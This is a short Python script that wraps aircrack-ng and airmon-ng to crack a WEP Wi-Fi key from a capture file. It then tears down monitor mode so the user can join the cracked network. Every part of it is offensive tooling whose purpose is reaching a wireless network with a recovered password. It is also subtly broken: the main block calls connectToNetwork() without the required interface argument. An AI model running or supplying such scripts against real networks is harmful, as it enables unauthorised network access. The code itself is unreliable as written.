import os
from time import sleep

def aircrack():
    os.system("aircrack-ng wep.cap")

def connectToNetwork(interface):
    print("connecting to network") 
    os.system("airmon-ng stop {}".format(interface))
    os.system("ifconfig {} down".format(interface[0:len(interface) - 3]))
    os.system("ifconfig eth0 up")
    os.system("service network-manager start")


if __name__ == "__main__":
    aircrack()
    print("you can close the other terminal now! we cracked the password")
    connectToNetwork()
    connected = input("please connect to the network using the password. press enter when ready")
